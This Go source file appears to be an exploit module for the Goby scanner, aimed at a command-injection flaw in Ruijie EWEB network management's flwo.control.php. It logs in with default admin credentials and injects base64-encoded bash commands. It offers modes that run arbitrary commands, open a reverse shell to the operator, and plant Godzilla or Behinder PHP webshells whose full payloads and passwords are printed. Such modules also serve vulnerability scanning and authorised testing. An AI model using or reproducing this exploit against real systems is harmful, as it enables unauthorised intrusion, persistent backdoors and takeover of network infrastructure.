package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Ruijie EWEB Network Management System flwo.control.php type Arbitrary Command Execution Vulnerability",
    "Description": "<p>Ruijie Network Management System is a new generation of cloud based network management software developed by Beijing Ruijie Data Era Technology Co., Ltd. With the slogan of \"Innovative Network Management and Information Security in the Data Age\", it is positioned as a unified solution for terminal security, IT operations, and enterprise service-oriented management.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Ruijie-EWEB-NMS",
    "Homepage": "https://www.ruijie.com.cn/",
    "DisclosureDate": "2023-02-22",
    "Author": "715827922@qq.com",
    "FofaQuery": "(body=\"<span class=\\\"resource\\\" mark=\\\"login.copyRight\\\">锐捷网络</span>\" && body=\"login.getDeviceInfo\") || title=\"锐捷网络-EWEB网管系统\"",
    "GobyQuery": "(body=\"<span class=\\\"resource\\\" mark=\\\"login.copyRight\\\">锐捷网络</span>\" && body=\"login.getDeviceInfo\") || title=\"锐捷网络-EWEB网管系统\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>Please pay attention to the manufacturer's official website and update the latest system: <a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,behinder,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "9999.txt",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "hello",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Ruijie-EWEB 网管系统 flwo.control.php 文件 type 参数任意命令执行漏洞",
            "Product": "Ruijie-EWEB网管系统",
            "Description": "<p>锐捷网管系统是由北京锐捷数据时代科技有限公司开发的新一代基于云的网络管理软件，以“数据时代创新网管与信息安全”为口号，定位于终端安全、IT运营及企业服务化管理统一解决方案。</p><p>Ruijie-EWEB 网管系统 flwo.control.php 中的 type 参数存在命令执行漏洞，攻击者可利用该漏洞执行任意命令。</p>",
            "Recommendation": "<p>请及时关注厂商官网，并更新最新系统：<a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ruijie EWEB Network Management System flwo.control.php type Arbitrary Command Execution Vulnerability",
            "Product": "Ruijie-EWEB-NMS",
            "Description": "<p>Ruijie Network Management System is a new generation of cloud based network management software developed by Beijing Ruijie Data Era Technology Co., Ltd. With the slogan of \"Innovative Network Management and Information Security in the Data Age\", it is positioned as a unified solution for terminal security, IT operations, and enterprise service-oriented management.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>Please pay attention to the manufacturer's official website and update the latest system: <a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10832"
}`
	getLoginCookieDJQOWIUE := func(hostInfo *httpclient.FixUrl) string {
		postRequestConfig := httpclient.NewPostRequestConfig("/ddi/server/login.php")
		postRequestConfig.VerifyTls = false
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postRequestConfig.Data = "username=admin&password=admin?"
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil || resp.StatusCode != 200 || !strings.Contains(resp.Utf8Html, `"status":1`) {
			return ""
		}
		return resp.Cookie
	}

	sendPayloadDJQOWIUE := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		cookie := getLoginCookieDJQOWIUE(hostInfo)
		if cookie == "" {
			return nil, errors.New("漏洞利用失败")
		}
		postRequestConfig := httpclient.NewPostRequestConfig("/flow_control_pi/flwo.control.php?a=getFlowGroup")
		postRequestConfig.VerifyTls = false
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postRequestConfig.Header.Store("Cookie", cookie)
		postRequestConfig.Data = "type=" + url.QueryEscape(`|bash -c 'echo `+base64.StdEncoding.EncodeToString([]byte(cmd))+` | base64 -d | bash && exit 0'`)
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	executeCommanddJQWOIUR := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		_, err := sendPayloadDJQOWIUE(hostInfo, `rm -rf ../aaaaaaaa.txt && `+cmd+` > ../aaaaaaaa.txt 2>&1`)
		if err != nil {
			return nil, err
		}
		getResultConfig := httpclient.NewGetRequestConfig(`/aaaaaaaa.txt`)
		getResultConfig.FollowRedirect = false
		getResultConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getResultConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(16)
			rsp, _ := executeCommanddJQWOIUR(hostInfo, `echo `+checkString)
			return rsp != nil && strings.Contains(rsp.Utf8Html, checkString)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			if attackType == "cmd" {
				rsp, err := executeCommanddJQWOIUR(expResult.HostInfo, `rm -rf ../aaaaaaaa.txt && `+cmd+` > ../aaaaaaaa.txt 2>&1`)
				expResult.Success = false
				if err != nil {
					expResult.Output = err.Error()
				} else if rsp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd = `nohup ` + godclient.ReverseTCPByBash(rp) + ` &`
				executeCommanddJQWOIUR(expResult.HostInfo, cmd)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				webshell := goutils.B2S(ss.Params["webshell"])
				filename := goutils.B2S(ss.Params["filename"])
				content := goutils.B2S(ss.Params["content"])
				filename = ""
				writeFileCmd := `echo "<?php \$filename=\$_POST['filename'];\$content=base64_decode(\$_POST['content']);file_put_contents(\$filename,\$content);?>" > ../dadadadadaup.php`
				if resp, err := sendPayloadDJQOWIUE(expResult.HostInfo, writeFileCmd); err == nil && resp.StatusCode == 200 {
					checkRequestConfig := httpclient.NewGetRequestConfig(`/dadadadadaup.php`)
					checkRequestConfig.VerifyTls = false
					checkRequestConfig.FollowRedirect = false
					resp, err := httpclient.DoHttpRequest(expResult.HostInfo, checkRequestConfig)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					} else if resp.StatusCode != 200 && resp.StatusCode != 500 {
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
						return expResult
					}
				}
				if webshell == "godzilla" {
					filename = goutils.RandomHexString(6) + ".php"
					content = "<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++) {$c = $K[$i+1&15];$D[$i] = $D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if (isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if (isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if (strpos($payload,\"getBasicsInfo\")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if (strpos($data,\"getBasicsInfo\")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}"
				} else if webshell == "behinder" {
					filename = goutils.RandomHexString(6) + ".php"
					content = "<?php @error_reporting(0);session_start();$key=\"e45e329feb5d925b\";$_SESSION['k']=$key;session_write_close();$post=file_get_contents(\"php://input\");if(!extension_loaded('openssl')){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++) {$post[$i] = $post[$i]^$key[$i+1&15]; }}else{$post=openssl_decrypt($post, \"AES128\", $key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p) {eval($p.\"\");}}@call_user_func(new C(),$params);?>"
				} else if webshell == "custom" {
					content = goutils.B2S(ss.Params["content"])
					filename = goutils.B2S(ss.Params["filename"])
				}
				postConfig := httpclient.NewPostRequestConfig(`/dadadadadaup.php`)
				postConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				postConfig.VerifyTls = false
				postConfig.FollowRedirect = false
				postConfig.Data = fmt.Sprintf("filename=" + filename + "&content=" + base64.StdEncoding.EncodeToString([]byte(content)) + "")
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, postConfig); err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				} else {
					expResult.Success = true
					expResult.Output = fmt.Sprintf("WebShell URL: %s\n", expResult.HostInfo.FixedHostInfo+"/"+filename)
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.0.1\n"
					}
					if webshell != "custom" {
						expResult.Output += "Webshell type: PHP"
					}
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
